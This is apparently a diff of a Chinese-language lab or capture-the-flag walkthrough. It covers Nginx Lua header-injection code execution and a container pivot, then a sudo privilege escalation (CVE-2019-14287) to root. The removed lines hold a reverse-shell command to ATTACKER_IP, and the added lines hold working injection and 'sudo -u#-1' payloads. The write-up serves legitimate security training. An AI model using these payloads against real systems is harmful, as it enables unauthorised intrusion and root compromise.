@@ -26,15 +26,15 @@
 
 ### 第三階段：遠端代碼執行 (Lua RCE)
 *   **發現**：在 `/system-status/` (site-a-status) 原始碼中發現 `X-NEO-DEBUG` 的具體用法。
-*   **利用**：透過 Nginx Lua 注入取得系統低權限 Shell。
-    `curl -H "X-NEO-DEBUG: os.execute('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')" http://localhost:8080/api/debug-system`
-*   **狀態**：獲得 `neo-user` 使用者權限。
+*   **利用**：透過 Nginx Lua 注入取得 Gateway 容器的控制權。
+    `curl -H 'X-NEO-DEBUG: ngx.say(io.popen("id"):read("*a"))' http://localhost:8080/api/debug-system`
+*   **狀態**：獲得 `nobody` 使用者權限 (於 `nginx-gateway` 容器內)。
 
-### 第四階段：權限提升 (CVE-2019-14287)
-*   **偵察**：執行 `sudo -l` 發現配置：`(ALL, !root) NOPASSWD: /bin/bash`。
-*   **利用**：使用特定的 UID 繞過 root 限制。
-    `sudo -u#-1 /bin/bash`
-*   **結果**：成功取得 **root** 權限。
+### 第四階段：橫向移動與權限提升 (Pivot & CVE-2019-14287)
+*   **戰術**：由於 `neo-mall` 容器的 `/api/seller/diag` 介面允許來自 Docker 內網的未授權訪問，攻擊者利用 Gateway 的 Lua RCE 作為跳板，向 `neo-mall` 發送指令。
+*   **利用**：結合 **CVE-2019-14287**，透過 Lua RCE 遠端呼叫 Mall 的診斷 API 執行提權指令 (繞過 root 限制)。
+    `curl -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /bin/bash -c id\\\"}\""):read("*a"))' http://localhost:8080/api/debug-system`
+*   **結果**：伺服器回傳 `uid=0(root)`，成功在 `neo-mall` 容器中取得 **root** 權限。
 
 ### 第五階段：獲取 Flag
 *   **動作**：執行 root 專屬腳本生成對應學號的動態識別碼。
